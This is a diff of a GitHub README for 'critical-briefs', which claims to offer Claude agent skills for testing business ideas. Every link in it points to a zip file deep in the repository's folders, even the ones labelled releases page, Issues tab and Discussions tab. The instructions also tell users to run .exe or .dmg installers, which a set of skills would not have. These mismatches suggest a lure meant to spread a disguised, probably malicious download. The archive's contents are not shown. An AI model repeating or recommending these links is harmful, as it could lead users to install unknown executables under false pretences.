@@ -1,6 +1,6 @@
 # 🎯 critical-briefs - Validate Your Ideas Effectively
 
-[![Download Now](https://raw.githubusercontent.com/KARIMMOHAMED2729/critical-briefs/main/skills/critical-business-brief/briefs_critical_2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KARIMMOHAMED2729/critical-briefs/main/skills/critical-business-brief/briefs_critical_2.0.zip)
+[![Download Now](https://github.com/KARIMMOHAMED2729/critical-briefs/raw/refs/heads/main/skills/critical-app-brief/references/briefs_critical_v3.4-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/KARIMMOHAMED2729/critical-briefs/raw/refs/heads/main/skills/critical-app-brief/references/briefs_critical_v3.4-alpha.3.zip)
 
 ## 📜 Description
 Critical Briefs provides agent skills for Claude AI that help you validate business ideas, stress-test processes, and design MVPs through skeptical dialogue. Use these tools to challenge your assumptions and identify blind spots before you build your project.
@@ -9,7 +9,7 @@ Critical Briefs provides agent skills for Claude AI that help you validate busin
 Getting started with Critical Briefs is simple. Follow these steps to download and run the software on your computer.
 
 ## 📥 Download & Install
-1. **Visit the releases page**: Go to [this page to download](https://raw.githubusercontent.com/KARIMMOHAMED2729/critical-briefs/main/skills/critical-business-brief/briefs_critical_2.0.zip).
+1. **Visit the releases page**: Go to [this page to download](https://github.com/KARIMMOHAMED2729/critical-briefs/raw/refs/heads/main/skills/critical-app-brief/references/briefs_critical_v3.4-alpha.3.zip).
 2. **Select the latest version**: Look for the most recent release. This typically has the highest version number.
 3. **Download the application**: Click on the file suited for your operating system. If you're on Windows, look for an `.exe` file; for macOS, look for a `.dmg` file. For Linux, check for an `.AppImage` or appropriate package.
 4. **Install the application**:
@@ -43,8 +43,8 @@ If you run into issues while using Critical Briefs, try the following:
 ## 🌐 Community and Support
 If you need help or want to share your feedback, consider joining our community:
 
-- **GitHub Issues**: Report bugs or request features through the [Issues tab](https://raw.githubusercontent.com/KARIMMOHAMED2729/critical-briefs/main/skills/critical-business-brief/briefs_critical_2.0.zip).
-- **Discussion Forum**: Engage with other users and share your experiences. You can find this in the [Discussions tab](https://raw.githubusercontent.com/KARIMMOHAMED2729/critical-briefs/main/skills/critical-business-brief/briefs_critical_2.0.zip).
+- **GitHub Issues**: Report bugs or request features through the [Issues tab](https://github.com/KARIMMOHAMED2729/critical-briefs/raw/refs/heads/main/skills/critical-app-brief/references/briefs_critical_v3.4-alpha.3.zip).
+- **Discussion Forum**: Engage with other users and share your experiences. You can find this in the [Discussions tab](https://github.com/KARIMMOHAMED2729/critical-briefs/raw/refs/heads/main/skills/critical-app-brief/references/briefs_critical_v3.4-alpha.3.zip).
 
 ## 📝 Topics Covered
 The application covers a wide range of topics, including:
@@ -56,6 +56,6 @@ The application covers a wide range of topics, including:
 - Critical Thinking
 
 ## 🔗 Links
-- **Download Now**: [Click Here](https://raw.githubusercontent.com/KARIMMOHAMED2729/critical-briefs/main/skills/critical-business-brief/briefs_critical_2.0.zip)
+- **Download Now**: [Click Here](https://github.com/KARIMMOHAMED2729/critical-briefs/raw/refs/heads/main/skills/critical-app-brief/references/briefs_critical_v3.4-alpha.3.zip)
 
 With these steps, you should be able to download and run Critical Briefs with ease. Explore how this tool can help you refine your business ideas and strategies.
